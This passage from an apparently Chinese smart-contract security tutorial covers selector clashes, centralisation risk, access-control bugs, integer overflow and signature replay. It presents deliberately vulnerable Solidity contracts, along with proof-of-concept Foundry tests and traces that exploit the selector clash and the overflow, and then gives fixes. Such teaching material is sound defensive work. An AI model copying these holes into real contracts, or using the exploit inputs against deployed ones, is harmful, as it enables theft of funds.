<p>有一天上午，俄狄浦斯路过此地，会见了女妖，并猜中了这神秘奥妙之谜。他说：“这是<code>&quot;function man()&quot;</code>啊！在生命的早晨，他是个孩子，用两条腿和两只手爬行；到了生命的中午，他变成壮年，只用两条腿走路；到了生命的傍晚，他年老体衰，必须借助拐杖走路，所以被称为三只脚。”谜语被猜中后，俄狄浦斯得以生还。</p>
<p>那一天下午，<code>0xAA</code>路过此地，会见了女妖，并猜中了这神秘奥妙之谜。他说：“这是<code>&quot;function peopleLduohW(uint256)&quot;</code>啊！在生命的早晨，他是个孩子，用两条腿和两只手爬行；到了生命的中午，他变成壮年，只用两条腿走路；到了生命的傍晚，他年老体衰，必须借助拐杖走路，所以被称为三只脚。”谜语再次被猜中后，斯芬克斯气急败坏，脚下一打滑就从巍峨的峭崖上掉下去摔死了。</p>
<p><img src="/img/web3/S02-2.png" srcset="/img/loading.gif" lazyload alt="S02-2"></p>
<h2 id="漏洞合约例子-1"><a href="#漏洞合约例子-1" class="headerlink" title="漏洞合约例子"></a>漏洞合约例子</h2><h3 id="漏洞合约"><a href="#漏洞合约" class="headerlink" title="漏洞合约"></a>漏洞合约</h3><p>下面我们来看一下有漏洞的合约例子。<code>SelectorClash</code>合约有<code>1</code>个状态变量 <code>solved</code>，初始化为<code>false</code>，攻击者需要将它改为<code>true</code>。合约主要有<code>2</code>个函数，函数名沿用自 Poly Network 漏洞合约。</p>
<ol>
<li><code>putCurEpochConPubKeyBytes()</code> ：攻击者调用这个函数后，就可以将<code>solved</code>改为<code>true</code>，完成攻击。但是这个函数检查<code>msg.sender == address(this)</code>，因此调用者必须为合约本身，我们需要看下其他函数。</li>
<li><code>executeCrossChainTx()</code> ：通过它可以调用合约内的函数，但是函数参数的类型和目标函数不太一样：目标函数的参数为<code>(bytes)</code>，而这里调用的函数参数为<code>(bytes,bytes,uint64)</code>。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: UNLICENSED<br>pragma solidity ^0.8.10;<br><br>contract SelectorClash &#123;<br>    bool public solved; // 攻击是否成功<br><br>    // 攻击者需要调用这个函数，但是调用者 msg.sender 必须是本合约。<br>    function putCurEpochConPubKeyBytes(bytes memory _bytes) public &#123;<br>        require(msg.sender == address(this), &quot;Not Owner&quot;);<br>        solved = true;<br>    &#125;<br><br>    // 有漏洞，攻击者可以通过改变 _method 变量碰撞函数选择器，调用目标函数并完成攻击。<br>    function executeCrossChainTx(bytes memory _method, bytes memory _bytes, bytes memory _bytes1, uint64 _num) public returns(bool success)&#123;<br>        (success, ) = address(this).call(abi.encodePacked(bytes4(keccak256(abi.encodePacked(_method, &quot;(bytes,bytes,uint64)&quot;))), abi.encode(_bytes, _bytes1, _num)));<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<h3 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h3><p>我们的目标是利用<code>executeCrossChainTx()</code>函数调用合约中的<code>putCurEpochConPubKeyBytes()</code>，目标函数的选择器为：<code>0x41973cd9</code>。观察到<code>executeCrossChainTx()</code>中是利用<code>_method</code>参数和<code>&quot;(bytes,bytes,uint64)&quot;</code>作为函数签名计算的选择器。因此，我们只需要选择恰当的<code>_method</code>，让这里算出的选择器等于<code>0x41973cd9</code>，通过选择器碰撞调用目标函数。</p>
<p>Poly Network黑客事件中，黑客碰撞出的<code>_method</code>为 <code>f1121318093</code>，即<code>f1121318093(bytes,bytes,uint64)</code>的哈希前<code>4</code>位也是<code>0x41973cd9</code>，可以成功的调用函数。接下来我们要做的就是将<code>f1121318093</code>转换为<code>bytes</code>类型：<code>0x6631313231333138303933</code>，然后作为参数输入到<code>executeCrossChainTx()</code>中。<code>executeCrossChainTx()</code>函数另<code>3</code>个参数不重要，填 <code>0x</code>, <code>0x</code>, <code>0</code> 就可以。</p>
<h2 id="演示-1"><a href="#演示-1" class="headerlink" title="&#96;&#96;演示"></a>&#96;&#96;演示</h2><ol>
<li>部署<code>SelectorClash</code>合约。</li>
<li>调用<code>executeCrossChainTx()</code>，参数填<code>0x6631313231333138303933</code>，<code>0x</code>，<code>0x</code>，<code>0</code>，发起攻击。</li>
<li>查看<code>solved</code>变量的值，被修改为<code>true</code>，攻击成功。</li>
</ol>
<h3 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract SelectorClashTest is Test &#123;<br>    SelectorClash private selector;<br>    function setUp() public &#123;<br>        selector = new SelectorClash();<br>    &#125;<br>    function test_selector() public &#123;<br>        bool Before=selector.solved();<br>        console.log(&quot;selector.solved Before is  &quot;,Before);<br>        bytes memory _method=&quot;0x6631313231333138303933&quot;;<br><br>        bool success = selector.executeCrossChainTx(<br>            hex&quot;6631313231333138303933&quot;, // bytes param1<br>            &quot;&quot;,                         // bytes param2<br>            &quot;&quot;,                         // bytes param3<br>            0                           // uint256 param4<br>        );<br>        bool After=selector.solved();<br>        console.log(&quot;selector.solved After is  &quot;,After);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs shell"><br>Logs:<br>  selector.solved Before is   false<br>  selector.solved After is   true<br><br>Traces:<br>  [41344] SelectorClashTest::test_selector()<br>    ├─ [2487] SelectorClash::solved() [staticcall]<br>    │   └─ ← [Return] false<br>    ├─ [0] console::log(&quot;selector.solved Before is  &quot;, false) [staticcall]<br>    │   └─ ← [Stop]<br>    ├─ [26267] SelectorClash::executeCrossChainTx(0x6631313231333138303933, 0x, 0x, 0)<br>    │   ├─ [21125] SelectorClash::putCurEpochConPubKeyBytes(0x)<br>    │   │   └─ ← [Stop]<br>    │   └─ ← [Return] true<br>    ├─ [487] SelectorClash::solved() [staticcall]<br>    │   └─ ← [Return] true<br>    ├─ [0] console::log(&quot;selector.solved After is  &quot;, true) [staticcall]<br>    │   └─ ← [Stop]<br>    └─ ← [Stop]<br><br></code></pre></td></tr></table></figure>

<h1 id="S03-中心化风险"><a href="#S03-中心化风险" class="headerlink" title="S03 中心化风险"></a>S03 中心化风险</h1><p>伪去中心化的项目通常对外鼓吹自己是去中心化的，但实际上和中心化项目一样存在单点风险。比如使用多签钱包来管理智能合约，但几个多签人是一致行动人，背后由一个人控制。这类项目由于包装的很去中心化，容易得到投资者信任，所以当黑客事件发生时，被盗金额也往往更大。</p>
<p>近两年爆火的链游项目 Axie 的 Ronin 链跨链桥项目在 2022 年 3 月被盗 6.24 亿美元，是历史上被盗金额最大的事件。Ronin 跨链桥由 9 个验证者维护，必须有 5 个人达成共识才能批准存款和提款交易。这看起来像多签一样，非常去中心化。但实际上其中 4 个验证者由 Axie 的开发公司 Sky Mavis 控制，而另 1 个由 Axie DAO 控制的验证者也批准了 Sky Mavis 验证节点代表他们签署交易。因此，在攻击者获取了 Sky Mavis 的私钥后（具体方法未披露），就可以控制 5 个验证节点，授权盗走了 173,600 ETH 和 2550 万 USDC。此外，在 2023 年 8 月 1 日，PEPE 多重签名钱包将阈值从<code>5/8</code>更改为仅<code>2/8</code>，并从多签地址转出大量 PEPE，这也是伪去中心化的体现。</p>
<p><code>Harmony</code>公链的跨链桥在 2022 年 6 月被盗 1 亿美元。<code>Harmony</code>桥由 5 个多签人控制，很离谱的是只需其中 2 个人签名就可以批准一笔交易。在黑客设法盗取两个多签人的私钥后，将用户质押的资产盗空</p>
<h2 id="漏洞合约例子-2"><a href="#漏洞合约例子-2" class="headerlink" title="漏洞合约例子"></a>漏洞合约例子</h2><p>有中心化风险的合约多种多样，这里只举一个最常见的例子：<code>owner</code>地址可以任意铸造代币的<code>ERC20</code>合约。当项目内鬼或黑客取得<code>owner</code>的私钥后，可以无限铸币，造成投资人大量损失。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.21;<br><br>import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;<br>import &quot;@openzeppelin/contracts/access/Ownable.sol&quot;;<br><br>contract Centralization is ERC20, Ownable &#123;<br>    constructor() ERC20(&quot;Centralization&quot;, &quot;Cent&quot;) &#123;<br>        address exposedAccount = 0xe16C1623c1AA7D919cd2241d8b36d9E79C1Be2A2;<br>        transferOwnership(exposedAccount);<br>    &#125;<br><br>    function mint(address to, uint256 amount) external onlyOwner&#123;<br>        _mint(to, amount);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<h2 id="如何减少中心化-伪去中心化风险？"><a href="#如何减少中心化-伪去中心化风险？" class="headerlink" title="如何减少中心化&#x2F;伪去中心化风险？"></a>如何减少中心化&#x2F;伪去中心化风险？</h2><ol>
<li>使用多签钱包管理国库和控制合约参数。为了兼顾效率和去中心化，可以选择 4&#x2F;7 或 6&#x2F;9 多签。如果你不了解多签钱包，可以阅读<a target="_blank" rel="noopener" href="https://github.com/AmazingAng/WTF-Solidity/blob/main/50_MultisigWallet/readme.md">WTF Solidity 第 50 讲：多签钱包</a>。</li>
<li>多签的持有人要多样化，分散在创始团队、投资人、社区领袖之间，并且不要相互授权签名。</li>
<li>使用时间锁控制合约，在黑客或项目内鬼修改合约参数&#x2F;盗取资产时，项目方和社区有一些时间来应对，将损失最小化。如果你不了解时间锁合约，可以阅读<a target="_blank" rel="noopener" href="https://github.com/AmazingAng/WTF-Solidity/blob/main/45_Timelock/readme.md">WTF Solidity 第 45 讲：时间锁</a>。</li>
</ol>
<h1 id="S04-权限管理漏洞"><a href="#S04-权限管理漏洞" class="headerlink" title="S04. 权限管理漏洞"></a>S04. 权限管理漏洞</h1><p>智能合约中的权限管理定义了不同角色在应用中的权限。通常来说，代币的铸造、提取资金、暂停等功能都需要较高权限的用户才能调用。如果权限配置错误，就可能造成意想不到的损失。下面我们介绍两种常见的权限管理漏洞。</p>
<p>在下面的代码中，<code>mint()</code>函数没有进行权限管理，那么任何人都可以调用它铸造代币。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 错误的mint函数，没有限制权限<br>function badMint(address to, uint amount) public &#123;<br>    _mint(to, amount);<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="2-授权检查错误"><a href="#2-授权检查错误" class="headerlink" title="2. 授权检查错误"></a>2. 授权检查错误</h3><p>另一类常见的权限管理漏洞是没有在函数中检查调用者是否拥有足够的授权。BSC上DeFi项目 ShadowFi 的代币合约忘了在 <code>burn()</code> 销毁函数中检查调用者的授权额度，导致攻击者可以任意的销毁其他地址的代币。在黑客将流动性池子中的代币销毁之后，仅需卖出一点代币就可以将池子里的所有 <code>BNB</code> 提走，获利 $300,000。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 错误的burn函数，没有限制权限<br>function badBurn(address account, uint amount) public &#123;<br>    _burn(account, amount);<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="预防办法"><a href="#预防办法" class="headerlink" title="预防办法"></a>预防办法</h2><p>权限管理漏洞主要有两种预防办法：</p>
<ol>
<li>使用 Openzeppelin 的权限管理库给合约的特殊函数配置相应的权限，比如使用<code>OnlyOwner</code>修饰器，只有合约所有者才能调用。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 正确的mint函数，使用 onlyOwner 修饰器限制权限<br>function goodMint(address to, uint amount) public onlyOwner &#123;<br>    _mint(to, amount);<br>&#125;<br></code></pre></td></tr></table></figure>



<ol>
<li>在函数的逻辑中确保合约调用者拥有足够的授权。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 正确的burn函数，如果销毁的不是自己的代币，则会检查授权<br>function goodBurn(address account, uint amount) public &#123;<br>    if(msg.sender != account)&#123;<br>        _spendAllowance(account, msg.sender, amount);<br>    &#125;<br>    _burn(account, amount);<br>&#125;<br></code></pre></td></tr></table></figure>

<h1 id="S05-整型溢出"><a href="#S05-整型溢出" class="headerlink" title="S05. 整型溢出"></a>S05. 整型溢出</h1><p>整型溢出漏洞（Arithmetic Over&#x2F;Under Flows）。这是一个比较经典的漏洞，Solidity 0.8版本后内置了Safemath库，因此很少发生</p>
<p>以太坊虚拟机（EVM）为整型设置了固定大小，因此它只能表示特定范围的数字。例如 <code>uint8</code>，只能表示 [0,255] 范围内的数字。如果给 <code>uint8</code> 类型变量的赋值 <code>257</code>，则会上溢（overflow）变为 <code>1</code>；如果给它赋值<code>-1</code>，则会下溢（underflow）变为<code>255</code>。</p>
<p>攻击者可以利用这个漏洞进行攻击：想象一下，黑客余额为<code>0</code>，他凭空花 <code>$1</code> 之后，余额突然变成了 <code>$2^256-1</code>。2018年的土狗项目 <code>PoWHC</code> 因为这个漏洞被盗了 <code>866 ETH</code>。</p>
<p><img src="/img/web3/S05-1.png" srcset="/img/loading.gif" lazyload alt="S05-1"></p>
<h2 id="漏洞合约例子-3"><a href="#漏洞合约例子-3" class="headerlink" title="漏洞合约例子"></a>漏洞合约例子</h2><p>下面这个例子是一个简单的代币合约，参考了 <code>Ethernaut</code> 中的合约。它有 <code>2</code> 个状态变量：<code>balances</code> 记录了每个地址的余额，<code>totalSupply</code> 记录了代币总供给。</p>
<p>它有 <code>3</code> 个函数：</p>
<ul>
<li>构造函数：初始化代币总供给。</li>
<li><code>transfer()</code>：转账函数。</li>
<li><code>balanceOf()</code>：查询余额函数。</li>
</ul>
<p>由于solidity <code>0.8.0</code> 版本之后会自动检查整型溢出错误，溢出时会报错。如果我们要重现这种漏洞，需要使用 <code>unchecked</code> 关键字，在代码块中临时关掉溢出检查，就像我们在 <code>transfer()</code> 函数中做的那样。</p>
<p>这个例子中的漏洞就出现在<code>transfer()</code> 函数中，<code>require(balances[msg.sender] - _value &gt;= 0);</code> 这个检查由于整型溢出，永远都会通过。因此用户可以无限转账。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.21;<br><br>contract Token &#123;<br>  mapping(address =&gt; uint) balances;<br>  uint public totalSupply;<br><br>  constructor(uint _initialSupply) &#123;<br>    balances[msg.sender] = totalSupply = _initialSupply;<br>  &#125;<br>  <br>  function transfer(address _to, uint _value) public returns (bool) &#123;<br>    unchecked&#123;<br>        require(balances[msg.sender] - _value &gt;= 0);<br>        balances[msg.sender] -= _value;<br>        balances[_to] += _value;<br>    &#125;<br>    return true;<br>  &#125;<br>  function balanceOf(address _owner) public view returns (uint balance) &#123;<br>    return balances[_owner];<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="测试代码："><a href="#测试代码：" class="headerlink" title="测试代码："></a>测试代码：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract TokenTest is Test &#123;<br>    Token private token;<br>    function setUp() public &#123;<br>        uint initialSupply = 100;<br>        token = new Token(initialSupply);<br>    &#125;<br><br>    function test_transfer() public &#123;<br>        uint Before = token.balanceOf(address(this));<br>        console.log(&quot;token.balanceOf Before is  &quot;, Before);<br>        bool success = token.transfer(0xe8D90137C2fb64d2e64E8BC65a171be53C952A9e, 1000);<br>        uint After = token.balanceOf(address(this));<br>        console.log(&quot;token.balanceOf After is  &quot;, After);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="测试结果：变成了一个很大的数字"><a href="#测试结果：变成了一个很大的数字" class="headerlink" title="测试结果：变成了一个很大的数字"></a>测试结果：变成了一个很大的数字</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell">Logs:<br>  token.balanceOf Before is   100<br>  token.balanceOf After is   115792089237316195423570985008687907853269984665640564039457584007913129639036<br><br>Traces:<br>  [42015] TokenTest::test_transfer()<br>    ├─ [2828] Token::balanceOf(TokenTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]<br>    │   └─ ← [Return] 100<br>    ├─ [0] console::log(&quot;token.balanceOf Before is  &quot;, 100) [staticcall]<br>    │   └─ ← [Stop]<br>    ├─ [26393] Token::transfer(0xe8D90137C2fb64d2e64E8BC65a171be53C952A9e, 1000)<br>    │   └─ ← [Return] true<br>    ├─ [828] Token::balanceOf(TokenTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]<br>    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639036 [1.157e77]<br>    ├─ [0] console::log(&quot;token.balanceOf After is  &quot;, 115792089237316195423570985008687907853269984665640564039457584007913129639036 [1.157e77]) [staticcall]<br>    │   └─ ← [Stop]<br>    └─ ← [Stop]<br><br></code></pre></td></tr></table></figure>

<h2 id="预防办法-1"><a href="#预防办法-1" class="headerlink" title="预防办法"></a>预防办法</h2><ol>
<li>Solidity <code>0.8.0</code> 之前的版本，在合约中引用 <a target="_blank" rel="noopener" href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v4.9/contracts/utils/math/SafeMath.sol">Safemath 库</a>，在整型溢出时报错。</li>
<li>Solidity <code>0.8.0</code> 之后的版本内置了 <code>Safemath</code>，因此几乎不存在这类问题。开发者有时会为了节省gas使用 <code>unchecked</code> 关键字在代码块中临时关闭整型溢出检测，这时要确保不存在整型溢出漏洞。</li>
</ol>
<h1 id="S06-签名重放"><a href="#S06-签名重放" class="headerlink" title="S06. 签名重放"></a>S06. 签名重放</h1><p>上学的时候，老师经常会让家长签字，有时候家长很忙，我就会很“贴心”照着以前的签字抄一遍。某种意义上来说，这就是签名重放。</p>
<p>数字签名一般有两种常见的重放攻击：</p>
<ol>
<li>普通重放：将本该使用一次的签名多次使用。NBA官方发布的《The Association》系列 NFT 因为这类攻击被免费铸造了上万枚。</li>
<li>跨链重放：将本该在一条链上使用的签名，在另一条链上重复使用。做市商 Wintermute 因为跨链重放攻击被盗2000万枚 $OP。</li>
</ol>
<p><img src="/img/web3/S06-1.png" srcset="/img/loading.gif" lazyload alt="S06-1"></p>
<h2 id="漏洞合约例子-4"><a href="#漏洞合约例子-4" class="headerlink" title="漏洞合约例子"></a>漏洞合约例子</h2><p>下面的<code>SigReplay</code>合约是一个<code>ERC20</code>代币合约，它的铸造函数有签名重放漏洞。它使用链下签名让白名单地址 <code>to</code> 铸造相应数量 <code>amount</code> 的代币。合约中保存了 <code>signer</code> 地址，来验证签名是否有效。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.21;<br><br>import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;<br>import &quot;@openzeppelin/contracts/access/Ownable.sol&quot;;<br>import &quot;@openzeppelin/contracts/utils/cryptography/ECDSA.sol&quot;;<br><br>// 权限管理错误例子<br>contract SigReplay is ERC20 &#123;<br><br>    address public signer;<br><br>    // 构造函数：初始化代币名称和代号<br>    constructor() ERC20(&quot;SigReplay&quot;, &quot;Replay&quot;) &#123;<br>        signer = msg.sender;<br>    &#125;<br>    <br>    /**<br>     * 有签名重放漏洞的铸造函数<br>     * to: 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4<br>     * amount: 1000<br>     * 签名： 0x5a4f1ad4d8bd6b5582e658087633230d9810a0b7b8afa791e3f94cc38947f6cb1069519caf5bba7b975df29cbfdb4ada355027589a989435bf88e825841452f61b<br>     */<br>    function badMint(address to, uint amount, bytes memory signature) public &#123;<br>        bytes32 _msgHash = toEthSignedMessageHash(getMessageHash(to, amount));<br>        require(verify(_msgHash, signature), &quot;Invalid Signer!&quot;);<br>        _mint(to, amount);<br>    &#125;<br><br>    /**<br>     * 将to地址（address类型）和amount（uint256类型）拼成消息msgHash<br>     * to: 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4<br>     * amount: 1000<br>     * 对应的消息msgHash: 0xb4a4ba10fbd6886a312ec31c54137f5714ddc0e93274da8746a36d2fa96768be<br>     */<br>    function getMessageHash(address to, uint256 amount) public pure returns(bytes32)&#123;<br>        return keccak256(abi.encodePacked(to, amount));<br>    &#125;<br><br>    /**<br>     * @dev 获得以太坊签名消息<br>     * `hash`：消息哈希 <br>     * 遵从以太坊签名标准：https://eth.wiki/json-rpc/API#eth_sign[`eth_sign`]<br>     * 以及`EIP191`:https://eips.ethereum.org/EIPS/eip-191`<br>     * 添加&quot;\x19Ethereum Signed Message:\n32&quot;字段，防止签名的是可执行交易。<br>     */<br>    function toEthSignedMessageHash(bytes32 hash) public pure returns (bytes32) &#123;<br>        // 32 is the length in bytes of hash,<br>        // enforced by the type signature above<br>        return keccak256(abi.encodePacked(&quot;\x19Ethereum Signed Message:\n32&quot;, hash));<br>    &#125;<br><br>    // ECDSA验证<br>    function verify(bytes32 _msgHash, bytes memory _signature) public view returns (bool)&#123;<br>        return ECDSA.recover(_msgHash, _signature) == signer;<br>    &#125;<br></code></pre></td></tr></table></figure>



<p><strong>注意</strong> 铸造函数 <code>badMint()</code> 没有对 <code>signature</code> 查重，导致同样的签名可以多次使用，无限铸造代币。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function badMint(address to, uint amount, bytes memory signature) public &#123;<br>    bytes32 _msgHash = toEthSignedMessageHash(keccak256(abi.encodePacked(to, amount)));<br>    require(verify(_msgHash, signature), &quot;Invalid Signer!&quot;);<br>    _mint(to, amount);<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="预防办法-2"><a href="#预防办法-2" class="headerlink" title="预防办法"></a>预防办法</h2><p>签名重放攻击主要有两种预防办法：</p>
<ol>
<li><p>将使用过的签名记录下来，比如记录下已经铸造代币的地址 <code>mintedAddress</code>，防止签名反复使用：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs solidity">mapping(address =&gt; bool) public mintedAddress;   // 记录已经mint的地址<br><br>function goodMint(address to, uint amount, bytes memory signature) public &#123;<br>    bytes32 _msgHash = toEthSignedMessageHash(getMessageHash(to, amount));<br>    require(verify(_msgHash, signature), &quot;Invalid Signer!&quot;);<br>    // 检查该地址是否mint过<br>    require(!mintedAddress[to], &quot;Already minted&quot;);<br>    // 记录mint过的地址<br>    mintedAddress[to] = true;<br>    _mint(to, amount);<br>&#125;<br>```solidity<br></code></pre></td></tr></table></figure>


</li>
<li><p>将 <code>nonce</code> （数值随每次交易递增）和 <code>chainid</code> （链ID）包含在签名消息中，这样可以防止普通重放和跨链重放攻击：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs solidity">uint nonce;<br><br>function nonceMint(address to, uint amount, bytes memory signature) public &#123;<br>    bytes32 _msgHash = toEthSignedMessageHash(keccak256(abi.encodePacked(to, amount, nonce, block.chainid)));<br>    require(verify(_msgHash, signature), &quot;Invalid Signer!&quot;);<br>    _mint(to, amount);<br>    nonce++;<br>&#125;<br></code></pre></td></tr></table></figure>


</li>
<li><p>对于由用户输入<code>signature</code>的场景，需要检验<code>signature</code>的长度，确保其长度为<code>65bytes</code>，否则也会产生签名重放问题。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function mint(address to, uint amount, bytes memory signature) public &#123;<br>    require(signature.length == 65, &quot;Invalid signature length&quot;);<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure></li>
</ol>
<p>一、签名重放攻击概念</p>
<p>1.定义</p>
<ul>
<li>攻击者截获有效签名</li>
<li>多次重复使用同一签名</li>
<li>非法执行授权操作</li>
</ul>
<p>2.典型攻击场景</p>
<ul>
<li>转账授权</li>
<li>特权操作</li>
<li>资产交易</li>
<li>权限验证</li>
</ul>
<p>四、最佳实践</p>
<p>1.始终使用Nonce<br>2.添加过期时间<br>3.使用域分隔符<br>4.限制签名使用次数<br>5.严格验证签名参数</p>
<p>五、常见错误</p>
<p>1.重用Nonce<br>2.没有过期机制<br>3.签名验证不严格<br>4.未限制签名范围</p>
<p>六、推荐库</p>
<p>1.OpenZeppelin</p>
<ul>
<li>提供安全签名工具</li>
